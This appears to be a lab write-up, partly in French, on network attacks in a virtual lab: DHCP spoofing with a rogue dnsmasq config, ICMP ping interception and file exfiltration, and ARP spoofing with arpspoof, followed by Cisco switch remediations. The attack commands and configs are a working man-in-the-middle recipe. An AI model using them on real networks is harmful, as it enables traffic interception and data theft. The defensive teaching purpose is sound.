# Setup

PC3> dhcp
DDORA IP 10.2.1.184/24 GW 10.2.1.254



PC3> ping 8.8.8.8

84 bytes from 8.8.8.8 icmp_seq=1 ttl=114 time=37.636 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=114 time=38.209 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=114 time=39.489 ms



R1#show ip int br
Interface                  IP-Address      OK? Method Status                Protocol
FastEthernet0/0            192.168.122.3   YES DHCP   up                    up  
FastEthernet1/0            10.2.1.254      YES NVRAM  up                    up  
FastEthernet1/1            unassigned      YES NVRAM  administratively down down
FastEthernet2/0            unassigned      YES NVRAM  administratively down down
FastEthernet2/1            unassigned      YES NVRAM  administratively down down
NVI0                       unassigned      NO  unset  up



PC3> ping 8.8.8.8

8.8.8.8 icmp_seq=1 timeout
84 bytes from 8.8.8.8 icmp_seq=2 ttl=114 time=36.501 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=114 time=53.740 ms



PC3> ping 10.2.1.51

84 bytes from 10.2.1.51 icmp_seq=1 ttl=64 time=8.285 ms
84 bytes from 10.2.1.51 icmp_seq=2 ttl=64 time=3.606 ms


Common network attacks


# DHCP

DHCP spoofing

┌──(kali㉿kali)-[~]
└─$ cat /etc/dnsmasq.conf 
server=1.1.1.1
listen-address=127.0.0.1
listen-address=10.2.1.187
no-dhcp-interface=
no-hosts
dhcp-range=10.2.1.220,10.2.1.230,12h
dhcp-option=option:netmask,255.255.255.0
dhcp-option=option:router,10.2.1.254
dhcp-option=option:dns-server,10.2.1.12
addn-hosts=/etc/dnsmasq.d/spoof.hosts

┌──(kali㉿kali)-[~]
└─$ 


Only Atk VM up - Legit DHCP Server Down

PC3> sh ip

NAME        : PC3[1]
IP/MASK     : 0.0.0.0/0
GATEWAY     : 0.0.0.0
DNS         :
MAC         : 00:50:79:66:68:05
LPORT       : 20044
RHOST:PORT  : 127.0.0.1:20045
MTU         : 1500

PC3> ip dhcp
DDORA IP 10.2.1.230/24 GW 10.2.1.254

PC3> sh ip

NAME        : PC3[1]
IP/MASK     : 10.2.1.230/24
GATEWAY     : 10.2.1.254
DNS         : 10.2.1.12
DHCP SERVER : 10.2.1.60
DHCP LEASE  : 43194, 43200/21600/37800
MAC         : 00:50:79:66:68:05
LPORT       : 20044
RHOST:PORT  : 127.0.0.1:20045
MTU         : 1500

PC3>


Legit DHCP + Atk VM up - DHCP Spoofing

Capture : [dhcp_spoof.pcapng](dhcp_spoof.pcapng)

PC3> sh ip

NAME        : PC3[1]
IP/MASK     : 0.0.0.0/0
GATEWAY     : 0.0.0.0
DNS         :
MAC         : 00:50:79:66:68:05
LPORT       : 20044
RHOST:PORT  : 127.0.0.1:20045
MTU         : 1500

PC3> ip dhcp
DORA IP 10.2.1.230/24 GW 10.2.1.254

PC3> sh ip

NAME        : PC3[1]
IP/MASK     : 10.2.1.230/24
GATEWAY     : 10.2.1.254
DNS         : 10.2.1.12
DHCP SERVER : 10.2.1.60
DHCP LEASE  : 40418, 43200/21600/37800
MAC         : 00:50:79:66:68:05
LPORT       : 20044
RHOST:PORT  : 127.0.0.1:20045
MTU         : 1500

Remédiation : 
Switch# conf t
Switch(config)# ip dhcp snooping
Switch(config)# ip dhcp snooping vlan ..
Switch(config)# interface ...
Switch(config-if)# ip dhcp snooping trust
Switch(config-if)# exit
Switch(config)# interface ...
Switch(config-if)# ip dhcp snooping untrust
Switch(config-if)# exit
Switch(config)# exit
Switch# show ip dhcp snooping

Switch# conf t
Switch(config)# interface ...
Switch(config-if)# switchport port-security
Switch(config-if)# switchport port-security maximum 2
Switch(config-if)# switchport port-security violation restrict
Switch(config-if)# switchport port-security mac-address sticky
Switch(config-if)# exit
Switch(config)# exit
Switch# show port-security


# ICMP

Interception ping

┌──(root㉿kali)-[/home/kali/Desktop/Script]
└─# python icmp_basic_receiver.py
Sniffing des paquets ICMP provenant de 127.0.0.1...
Ping reçu de 127.0.0.1 avec les données : test interception
Ping reçu de 127.0.0.1 avec les données : test interception
Ping reçu de 127.0.0.1 avec les données : test interception
Ping reçu de 127.0.0.1 avec les données : test interception



Exfiltration fichier

┌──(root㉿kali)-[/home/kali/Desktop/Script]
└─# python icmp_file_exfiltr.py
Envoi du bloc 1 vers 127.0.0.1 : b'toto\n'
Exfiltration terminée
#### Interception ping

Remédiation :


# ARP 
┌──(root㉿kali)-[~]
└─$ echo 1 > /proc/sys/net/ipv4/ip_forward

┌──(root㉿kali)-[~]
└─$ arpspoof -i eth0 -t 10.2.1.100 -r 10.2.1.254
ARP reply sent to 10.2.1.100 (00:11:22:33:44:55) telling it's 10.2.1.254
ARP reply sent to 10.2.1.254 (00:11:22:33:44:55) telling it's 10.2.1.100
...

PC1> sh arp

10.2.1.254  00:50:79:66:68:05
10.2.1.100  00:11:22:33:44:55

PC1> sh arp

10.2.1.254  00:11:22:33:44:55
10.2.1.100  00:11:22:33:44:55

Remédiation : 

Switch(config)# ip arp inspection vlan ..
Switch(config)# ip dhcp snooping
Switch(config)# ip dhcp snooping vlan ..
Switch(config)# exit
Switch# show ip arp inspection

